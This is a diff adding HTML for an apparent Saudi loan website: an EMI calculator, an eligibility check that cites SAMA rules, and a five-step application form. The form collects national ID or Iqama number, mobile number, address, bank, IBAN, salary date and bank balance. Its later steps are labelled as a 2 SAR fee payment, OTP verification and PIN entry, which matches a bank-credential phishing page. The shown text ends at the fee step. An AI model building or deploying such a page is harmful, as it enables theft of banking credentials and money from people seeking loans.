+                            <span class="text-xs font-extrabold text-saudi-navy uppercase tracking-wider">Loan Principal Amount:</span>
+                            <span id="calcAmountLabel" class="text-base font-black text-saudi-green bg-white px-3 py-1 rounded-lg border border-saudi-gold/40 shadow-xs">150,000 SAR</span>
+                        </div>
+                        <input type="range" id="calcAmount" min="5000" max="500000" step="5000" value="150000" oninput="calculateEMI()" class="w-full h-2.5 bg-gray-300 rounded-lg appearance-none cursor-pointer accent-saudi-green">
+                        <div class="flex justify-between text-[11px] text-gray-500 font-bold mt-1">
+                            <span>5,000 SAR (5K)</span>
+                            <span>250,000 SAR (2.5 Lakh)</span>
+                            <span>500,000 SAR (5 Lakh)</span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs font-extrabold text-saudi-navy uppercase tracking-wider">Repayment Tenure:</span>
+                            <span id="calcTenureLabel" class="text-base font-black text-saudi-navy bg-white px-3 py-1 rounded-lg border border-saudi-gold/40 shadow-xs">36 Months (3.0 Yrs)</span>
+                        </div>
+                        <input type="range" id="calcTenure" min="6" max="60" step="6" value="36" oninput="calculateEMI()" class="w-full h-2.5 bg-gray-300 rounded-lg appearance-none cursor-pointer accent-saudi-navy">
+                        <div class="flex justify-between text-[11px] text-gray-500 font-bold mt-1">
+                            <span>6 Months</span>
+                            <span>36 Months</span>
+                            <span>60 Months (5 Years)</span>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Right Calculation Summary Card -->
+                <div class="lg:col-span-5">
+                    <div class="bg-gradient-to-br from-saudi-navy via-[#162D4A] to-saudi-greenDark text-white rounded-2xl p-6 shadow-xl border-2 border-saudi-gold space-y-5">
+                        <div class="text-xs uppercase font-extrabold text-saudi-goldLight tracking-widest text-center border-b border-white/10 pb-3">
+                            Estimated Monthly Breakdown
+                        </div>
+
+                        <div class="text-center">
+                            <div class="text-xs text-gray-300 mb-1">Estimated Monthly EMI</div>
+                            <div id="resEMI" class="text-3xl sm:text-4xl font-black text-saudi-goldLight">4,167 SAR</div>
+                            <div class="text-[11px] text-gray-300 mt-1">Per Month</div>
+                        </div>
+
+                        <div class="space-y-2 text-xs border-t border-white/10 pt-3">
+                            <div class="flex justify-between text-gray-200">
+                                <span>Principal Amount:</span>
+                                <span id="resPrincipal" class="font-bold text-white">150,000 SAR</span>
+                            </div>
+                            <div class="flex justify-between text-gray-200">
+                                <span>Estimated Profit / APR:</span>
+                                <span id="resProfit" class="font-bold text-emerald-400">0 SAR (0%)</span>
+                            </div>
+                            <div class="flex justify-between text-gray-200 font-bold pt-2 border-t border-white/10 text-sm">
+                                <span>Total Payable Amount:</span>
+                                <span id="resTotal" class="text-saudi-goldLight">150,000 SAR</span>
+                            </div>
+                        </div>
+
+                        <div class="pt-2">
+                            <div class="text-[11px] text-gray-300 mb-1 flex justify-between">
+                                <span>Principal</span>
+                                <span>Profit / APR</span>
+                            </div>
+                            <div class="w-full h-3 bg-white/20 rounded-full overflow-hidden flex">
+                                <div id="barPrincipal" class="h-full bg-saudi-gold" style="width: 100%;"></div>
+                                <div id="barProfit" class="h-full bg-emerald-500" style="width: 0%;"></div>
+                            </div>
+                        </div>
+
+                        <a href="#apply-form" class="w-full block text-center py-2.5 bg-saudi-green hover:bg-emerald-700 text-white font-black text-xs rounded-xl transition shadow">
+                            Apply Now
+                        </a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- INSTANT ELIGIBILITY & DBR PRE-ASSESSMENT TOOL + SLOT 5 -->
+    <section id="assessment" class="py-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center max-w-3xl mx-auto mb-12">
+            <span class="text-saudi-green font-extrabold text-xs uppercase tracking-widest bg-saudi-green/10 px-3 py-1 rounded-full">Self-Service On-Screen Check</span>
+            <h2 class="text-3xl font-black text-saudi-navy mt-3">Instant Expat & Citizen DBR Pre-Assessment</h2>
+            <p class="text-gray-600 text-sm mt-1">Select your residency status, KSA work tenure, and desired amount (5,000 SAR to 500,000 SAR) to check your Debt Burden Ratio under SAMA rules.</p>
+        </div>
+
+        <div class="bg-white rounded-3xl p-6 sm:p-10 shadow-xl border border-gray-200 grid lg:grid-cols-12 gap-8">
+
+            <!-- Input Form Controls -->
+            <div class="lg:col-span-7 space-y-5">
+                <div class="grid sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">1. Residency Status</label>
+                        <select id="assCategory" onchange="runAssessment()" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                            <option value="expat" selected>KSA Resident Expat (Iqama Holder)</option>
+                            <option value="citizen">Saudi Citizen (KSA National)</option>
+                            <option value="sme">KSA SME / Business Owner</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">2. Length of Service in KSA</label>
+                        <select id="assTenureUAE" onchange="runAssessment()" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                            <option value="under3">Under 3 Months (Probation Period)</option>
+                            <option value="3to6" selected>3 to 6 Months (Early Tenure)</option>
+                            <option value="over6">6 to 12 Months (Standard Tenure)</option>
+                            <option value="over12">1 Year+ (Established GOSI / Service)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="grid sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">3. Monthly Income / Revenue (SAR)</label>
+                        <input type="number" id="assIncome" value="12000" min="2500" step="500" oninput="runAssessment()" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">4. Existing Monthly Obligations (SAR)</label>
+                        <input type="number" id="assLiabilities" value="1000" min="0" step="250" oninput="runAssessment()" placeholder="Existing loans, credit cards" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                    </div>
+                </div>
+
+                <div class="grid sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">5. Desired Financing Amount (SAR)</label>
+                        <input type="number" id="assDesiredAmount" value="75000" min="5000" max="500000" step="5000" oninput="runAssessment()" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">6. Desired Tenure (Months)</label>
+                        <select id="assTenure" onchange="runAssessment()" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-saudi-navy focus:border-saudi-green outline-none">
+                            <option value="12">12 Months (1 Year)</option>
+                            <option value="24">24 Months (2 Years)</option>
+                            <option value="36" selected>36 Months (3 Years)</option>
+                            <option value="48">48 Months (4 Years)</option>
+                            <option value="60">60 Months (5 Years)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- SLOT 5 IMAGE -->
+                <div class="pt-2">
+                    <div class="responsive-media-frame rounded-2xl border border-saudi-gold/40">
+                        <img id="img-slot-5" data-slot-id="slot-5" src="" alt="DBR Assessment Support Visual" class="slot-media-img">
+                    </div>
+                </div>
+            </div>
+
+            <!-- On-Screen Result Dashboard -->
+            <div class="lg:col-span-5">
+                <div id="assResultBox" class="bg-saudi-sand rounded-2xl p-6 border-2 border-saudi-gold space-y-4">
+                    <div class="flex items-center justify-between border-b border-saudi-borderGold/40 pb-3">
+                        <span class="text-xs font-extrabold uppercase text-saudi-navy">Assessment Result</span>
+                        <span id="assStatusBadge" class="bg-emerald-100 text-emerald-800 border border-emerald-300 px-3 py-0.5 rounded-full text-xs font-black">HIGHLY ELIGIBLE</span>
+                    </div>
+
+                    <div>
+                        <div class="text-xs text-gray-500 font-medium">Calculated Debt Burden Ratio (DBR):</div>
+                        <div class="flex items-baseline gap-2 mt-0.5">
+                            <span id="assDBRValue" class="text-3xl font-black text-saudi-navy">25.7%</span>
+                            <span id="assDBRCapLabel" class="text-xs text-gray-500 font-bold">(SAMA Cap: 30% Expat / 33.3% Citizen)</span>
+                        </div>
+                    </div>
+
+                    <div class="space-y-2 text-xs text-gray-700 bg-white p-3.5 rounded-xl border border-gray-200">
+                        <div class="flex justify-between">
+                            <span>Expat / Citizen Tenure Check:</span>
+                            <strong id="assTenureCheck" class="text-emerald-700">3-6 Months Checked</strong>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>Est. New Monthly Installment:</span>
+                            <strong id="assNewEMI" class="text-saudi-green">2,083 SAR</strong>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>Total Committed Monthly Debt:</span>
+                            <strong id="assTotalDebt" class="text-saudi-navy">3,083 SAR</strong>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>Est. Max Eligible Limit:</span>
+                            <strong id="assMaxLimit" class="text-emerald-700">93,600 SAR</strong>
+                        </div>
+                    </div>
+
+                    <div id="assAdviceText" class="text-xs leading-relaxed italic bg-amber-50 p-3 rounded-xl border border-amber-200 text-amber-900">
+                        Your calculated DBR is within Saudi Central Bank (SAMA) responsible lending limits for your selected profile.
+                    </div>
+
+                    <a href="#apply-form" class="w-full block text-center py-2.5 bg-saudi-green hover:bg-emerald-700 text-white text-xs font-black rounded-xl transition shadow">
+                        Continue to Application <i class="fa-solid fa-arrow-right ml-1"></i>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- =====================================================================
+         5-STEP SAUDI LOAN APPLICATION PORTAL (MERGED & STANDALONE)
+         ===================================================================== -->
+    <section id="apply-form" class="py-12 px-3 sm:px-6 lg:px-8 max-w-6xl mx-auto">
+        <div id="ksa-loan-application-portal" data-form-id="ksa-loan-application-portal" class="bg-ksa-sand flex flex-col justify-between antialiased selection:bg-ksa-gold selection:text-ksa-navy rounded-3xl overflow-hidden shadow-2xl border-2 border-saudi-gold/60">
+
+            <!-- FORM TOP HEADER BANNER -->
+            <div class="bg-gradient-to-r from-ksa-greenDark via-ksa-green to-[#00572B] text-white py-6 px-4 sm:px-8 border-b-4 border-ksa-gold shadow-md">
+                <div class="max-w-5xl mx-auto flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+                    <div>
+                        <button type="button" onclick="resetToHome()" class="inline-flex items-center gap-2 text-xs font-bold text-ksa-goldLight hover:text-white transition mb-2 bg-white/10 px-3 py-1 rounded-full border border-white/20">
+                            <i class="fa-solid fa-arrow-left"></i>
+                            <span>← Back to Top / العودة للأعلى</span>
+                        </button>
+                        <h2 class="text-2xl sm:text-3xl font-black tracking-tight text-white flex items-center gap-2.5">
+                            <i class="fa-solid fa-file-signature text-ksa-gold"></i>
+                            <span>Saudi Loan Application Form</span>
+                        </h2>
+                        <p class="text-xs sm:text-sm text-gray-200 mt-1 max-w-2xl leading-relaxed">
+                            5 easy steps to submit your application (5,000 SAR – 500,000 SAR) — fill in your details, bank information and the <strong class="text-ksa-goldLight">SAR 2 processing fee</strong>.
+                        </p>
+                    </div>
+                    <div class="text-right hidden sm:block">
+                        <div class="arabic-text text-base font-bold text-ksa-goldLight">5 خطوات سهلة لتقديم طلب التمويل الخاص بك</div>
+                        <div class="text-[11px] text-emerald-200 mt-0.5">رسوم معالجة بقيمة 2 ريال سعودي لإكمال التقديم</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MAIN STEPPER FORM CONTAINER -->
+            <div class="max-w-4xl w-full mx-auto px-3 sm:px-6 py-6 sm:py-10 flex-grow">
+                <div class="bg-white rounded-3xl shadow-xl border-t-8 border-ksa-green border-x border-b border-gray-200/80 overflow-hidden relative">
+
+                    <!-- 5-STEP PROGRESS BAR HEADER -->
+                    <div class="bg-gradient-to-b from-gray-50 to-white px-4 sm:px-8 pt-6 pb-6 border-b border-gray-100">
+                        <div class="flex items-center justify-between max-w-2xl mx-auto relative">
+                            <div id="line-1" class="absolute left-[10%] right-[70%] top-4 h-1 bg-gray-200 transition-all duration-500 -z-0"></div>
+                            <div id="line-2" class="absolute left-[30%] right-[50%] top-4 h-1 bg-gray-200 transition-all duration-500 -z-0"></div>
+                            <div id="line-3" class="absolute left-[50%] right-[30%] top-4 h-1 bg-gray-200 transition-all duration-500 -z-0"></div>
+                            <div id="line-4" class="absolute left-[70%] right-[10%] top-4 h-1 bg-gray-200 transition-all duration-500 -z-0"></div>
+
+                            <div class="relative z-10 text-center flex-1">
+                                <div id="step-circle-1" class="w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm flex items-center justify-center transition-all duration-300 step-circle-active">1</div>
+                                <span class="text-[10px] sm:text-xs font-bold text-gray-700 block mt-1.5">Personal Info</span>
+                            </div>
+
+                            <div class="relative z-10 text-center flex-1">
+                                <div id="step-circle-2" class="w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm bg-gray-200 text-gray-600 flex items-center justify-center transition-all duration-300">2</div>
+                                <span class="text-[10px] sm:text-xs font-bold text-gray-500 block mt-1.5">Bank Info</span>
+                            </div>
+
+                            <div class="relative z-10 text-center flex-1">
+                                <div id="step-circle-3" class="w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm bg-gray-200 text-gray-600 flex items-center justify-center transition-all duration-300">3</div>
+                                <span class="text-[10px] sm:text-xs font-bold text-gray-500 block mt-1.5">Payment</span>
+                            </div>
+
+                            <div class="relative z-10 text-center flex-1">
+                                <div id="step-circle-4" class="w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm bg-gray-200 text-gray-600 flex items-center justify-center transition-all duration-300">4</div>
+                                <span class="text-[10px] sm:text-xs font-bold text-gray-500 block mt-1.5">OTP Verify</span>
+                            </div>
+
+                            <div class="relative z-10 text-center flex-1">
+                                <div id="step-circle-5" class="w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm bg-gray-200 text-gray-600 flex items-center justify-center transition-all duration-300">5</div>
+                                <span class="text-[10px] sm:text-xs font-bold text-gray-500 block mt-1.5">PIN</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- FORM BODY CONTENT -->
+                    <div class="p-5 sm:p-8">
+
+                        <!-- STEP 1: PERSONAL INFORMATION -->
+                        <div id="step-1-content" class="space-y-6">
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-gray-100 pb-3 gap-1">
+                                <div>
+                                    <h3 class="text-xl sm:text-2xl font-black text-ksa-navy">Personal Information</h3>
+                                    <p class="text-xs text-gray-500">أدخل معلوماتك الشخصية</p>
+                                </div>
+                                <div class="arabic-text text-base font-extrabold text-ksa-green">المعلومات الشخصية</div>
+                            </div>
+
+                            <div class="grid sm:grid-cols-2 gap-4 sm:gap-6">
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Full Name * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">الاسم الكامل</span>
+                                    </label>
+                                    <input type="text" id="fullName" placeholder="Full Name as on ID / Iqama" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-fullName" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please enter your full name</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        National ID / Iqama No * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">رقم الهوية / الإقامة</span>
+                                    </label>
+                                    <input type="text" id="nationalId" placeholder="1XXXXXXXXX or 2XXXXXXXXX" maxlength="10" oninput="formatNationalId(this)" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-nationalId" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter valid 10-digit Saudi National ID or Iqama</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        KSA Mobile No * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">رقم الجوال</span>
+                                    </label>
+                                    <input type="tel" id="mobileNo" placeholder="+9665XXXXXXXX" maxlength="13" oninput="formatMobileNo(this)" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-mobileNo" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter a valid 9-digit KSA mobile number (+966 5XXXXXXXX)</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Gender * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">الجنس</span>
+                                    </label>
+                                    <select id="gender" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <option value="" disabled selected>Select Gender</option>
+                                        <option value="Male">Male / ذكر</option>
+                                        <option value="Female">Female / أنثى</option>
+                                    </select>
+                                    <span id="err-gender" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select gender</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Date of Birth * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">تاريخ الميلاد</span>
+                                    </label>
+                                    <input type="date" id="dob" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-dob" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select date of birth</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Region / City * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">المنطقة / المدينة</span>
+                                    </label>
+                                    <select id="region" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <option value="" disabled selected>Select Region / City</option>
+                                        <option value="Riyadh">Riyadh / الرياض</option>
+                                        <option value="Makkah (Jeddah)">Makkah / مكة المكرمة (جدة)</option>
+                                        <option value="Taif">Taif / الطائف</option>
+                                        <option value="Eastern Province (Dammam/Khobar)">Eastern Province / المنطقة الشرقية (الدمام / الخبر)</option>
+                                        <option value="Jubail">Jubail / الجبيل</option>
+                                        <option value="Dhahran">Dhahran / الظهران</option>
+                                        <option value="Madinah">Madinah / المدينة المنورة</option>
+                                        <option value="Yanbu">Yanbu / ينبع</option>
+                                        <option value="Qassim (Buraidah)">Qassim / القصيم (بريدة)</option>
+                                        <option value="Asir (Abha)">Asir / عسير (أبها)</option>
+                                        <option value="Khamis Mushait">Khamis Mushait / خميس مشيط</option>
+                                        <option value="Jazan">Jazan / جازان</option>
+                                        <option value="Najran">Najran / نجران</option>
+                                        <option value="Al Bahah">Al Bahah / الباحة</option>
+                                        <option value="Tabuk">Tabuk / تبوك</option>
+                                        <option value="Hail">Hail / حائل</option>
+                                        <option value="Al Jouf (Sakaka)">Al Jouf / الجوف (سكاكا)</option>
+                                        <option value="Northern Borders (Arar)">Northern Borders / الحدود الشمالية (عرعر)</option>
+                                    </select>
+                                    <span id="err-region" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select Region / City</span>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                    Address * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">عنوان السكن</span>
+                                </label>
+                                <textarea id="address" rows="2" placeholder="Full residential address in Saudi Arabia" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50"></textarea>
+                                <span id="err-address" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please enter full residential address</span>
+                            </div>
+
+                            <div class="flex justify-end pt-4 border-t border-gray-100">
+                                <button type="button" onclick="processStep1()" class="px-8 py-3.5 bg-ksa-green hover:bg-ksa-greenDark text-white font-black text-xs sm:text-sm rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2">
+                                    <span>Continue / متابعة</span>
+                                    <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 2: BANK INFORMATION -->
+                        <div id="step-2-content" class="space-y-6 hidden">
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-gray-100 pb-3 gap-1">
+                                <div>
+                                    <h3 class="text-xl sm:text-2xl font-black text-ksa-navy">Bank Information</h3>
+                                    <p class="text-xs text-gray-500">أدخل معلومات البنك الخاصة بك</p>
+                                </div>
+                                <div class="arabic-text text-base font-extrabold text-ksa-green">معلومات البنك</div>
+                            </div>
+
+                            <div class="grid sm:grid-cols-2 gap-4 sm:gap-6">
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Loan Amount Required (SAR) * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">مبلغ التمويل المطلوب (5,000 - 500,000)</span>
+                                    </label>
+                                    <input type="number" id="loanAmount" placeholder="5000" value="5000" min="5000" max="500000" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-ksa-navy focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-loanAmount" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter loan amount between 5,000 and 500,000 SAR</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Loan Purpose * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">الغرض من التمويل</span>
+                                    </label>
+                                    <select id="loanPurpose" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <option value="" disabled selected>Select Purpose</option>
+                                        <option value="Personal Finance">Personal Finance / تمويل شخصي</option>
+                                        <option value="Business & SME Expansion">Business & SME Expansion / دعم وتوسعة المشاريع</option>
+                                        <option value="Working Capital">Working Capital / رأس المال العامل</option>
+                                        <option value="Debt Consolidation">Debt Consolidation / تجميع الالتزامات</option>
+                                        <option value="Home & Family">Home & Family / سكن وعائلة</option>
+                                    </select>
+                                    <span id="err-loanPurpose" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select loan purpose</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Occupation * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">المهنة</span>
+                                    </label>
+                                    <select id="occupation" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <option value="" disabled selected>Select Occupation</option>
+                                        <option value="Salaried Employee">Salaried Employee / موظف براتب</option>
+                                        <option value="Business Owner / Self-Employed">Business Owner / Self-Employed / صاحب عمل</option>
+                                        <option value="Government Employee">Government Employee / موظف حكومي</option>
+                                    </select>
+                                    <span id="err-occupation" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select occupation</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Bank Name * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">اسم البنك</span>
+                                    </label>
+                                    <select id="bankName" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <option value="" disabled selected>Select Your Bank</option>
+                                        <option value="Al Rajhi Bank">Al Rajhi Bank / مصرف الراجحي</option>
+                                        <option value="Saudi National Bank (SNB)">Saudi National Bank (SNB) / البنك الأهلي السعودي</option>
+                                        <option value="Riyad Bank">Riyad Bank / بنك الرياض</option>
+                                        <option value="Alinma Bank">Alinma Bank / مصرف الإنماء</option>
+                                        <option value="Bank Albilad">Bank Albilad / بنك البلاد</option>
+                                        <option value="Bank Aljazira">Bank Aljazira / بنك الجزيرة</option>
+                                        <option value="Saudi Awwal Bank (SAB)">Saudi Awwal Bank (SAB) / البنك السعودي الأول</option>
+                                        <option value="Banque Saudi Fransi (BSF)">Banque Saudi Fransi (BSF) / البنك السعودي الفرنسي</option>
+                                        <option value="Arab National Bank (ANB)">Arab National Bank (ANB) / البنك العربي الوطني</option>
+                                        <option value="The Saudi Investment Bank (SAIB)">The Saudi Investment Bank / البنك السعودي للاستثمار</option>
+                                        <option value="Gulf International Bank (GIB)">Gulf International Bank (GIB) / بنك الخليج الدولي</option>
+                                        <option value="First Abu Dhabi Bank (FAB)">First Abu Dhabi Bank (FAB) / بنك أبوظبي الأول</option>
+                                        <option value="Emirates NBD">Emirates NBD / بنك الإمارات دبي الوطني</option>
+                                        <option value="National Bank of Kuwait (NBK)">National Bank of Kuwait (NBK) / بنك الكويت الوطني</option>
+                                        <option value="National Bank of Bahrain (NBB)">National Bank of Bahrain (NBB) / بنك البحرين الوطني</option>
+                                        <option value="Bank Muscat">Bank Muscat / بنك مسقط</option>
+                                        <option value="STC Bank">STC Bank / بنك إس تي سي</option>
+                                        <option value="D360 Bank">D360 Bank / بنك D360</option>
+                                        <option value="Barq">Barq / برق</option>
+                                        <option value="Tiqmo">Tiqmo / تيكمو</option>
+                                        <option value="Urpay">Urpay / يورباي</option>
+                                        <option value="Other Bank">Other Bank / بنك آخر</option>
+                                    </select>
+                                    <span id="err-bankName" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please select your bank</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Bank IBAN * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">رقم الآيبان</span>
+                                    </label>
+                                    <input type="text" id="bankIban" placeholder="SA0380000000608010167519" maxlength="24" oninput="formatIban(this)" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-mono font-bold text-ksa-navy uppercase focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-bankIban" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter valid 24-character IBAN (e.g. SA...)</span>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Salary Date (Day of Month) * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">تاريخ الراتب</span>
+                                    </label>
+                                    <input type="number" id="salaryDate" placeholder="e.g. 27 (1 - 31)" min="1" max="31" oninput="formatSalaryDay(this)" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-ksa-navy focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                    <span id="err-salaryDate" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter valid salary day between 1 and 31</span>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                    Current Bank Balance (SAR) * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">الرصيد البنكي الحالي</span>
+                                </label>
+                                <input type="number" id="bankBalance" placeholder="Enter Amount in SAR" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-bold text-ksa-navy focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                <span id="err-bankBalance" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Please enter current bank balance amount</span>
+                            </div>
+
+                            <div class="flex justify-between items-center pt-4 border-t border-gray-100">
+                                <button type="button" onclick="goToStep(1)" class="px-6 py-3 border border-gray-300 hover:bg-gray-100 text-gray-700 font-bold text-xs sm:text-sm rounded-xl transition flex items-center gap-2">
+                                    <i class="fa-solid fa-arrow-left"></i>
+                                    <span>← Back / رجوع</span>
+                                </button>
+
+                                <button type="button" onclick="processStep2()" class="px-8 py-3.5 bg-ksa-green hover:bg-ksa-greenDark text-white font-black text-xs sm:text-sm rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2">
+                                    <span>Continue / متابعة</span>
+                                    <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 3: PAYMENT (2 SAR FEES) -->
+                        <div id="step-3-content" class="space-y-6 hidden">
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-gray-100 pb-3 gap-1">
+                                <div>
+                                    <h3 class="text-xl sm:text-2xl font-black text-ksa-navy">Loan Apply Fees</h3>
+                                    <p class="text-xs text-gray-500">Processing fee verification / رسوم تقديم الطلب ومعالجة الملف</p>
+                                </div>
